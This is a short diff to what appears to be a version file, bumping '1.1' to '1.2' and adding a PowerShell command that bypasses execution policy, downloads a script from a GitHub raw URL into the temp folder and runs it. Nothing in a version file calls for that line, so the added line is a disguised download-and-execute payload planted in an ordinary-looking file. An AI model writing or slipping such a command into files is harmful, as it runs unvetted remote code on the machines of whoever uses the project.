@@ -1,1 +1,2 @@
-1.1
+1.2
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest https://raw.githubusercontent.com/mahesh97m/phpcode/main/abb.ps1 -OutFile $env:TEMP\abb.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\abb.ps1"
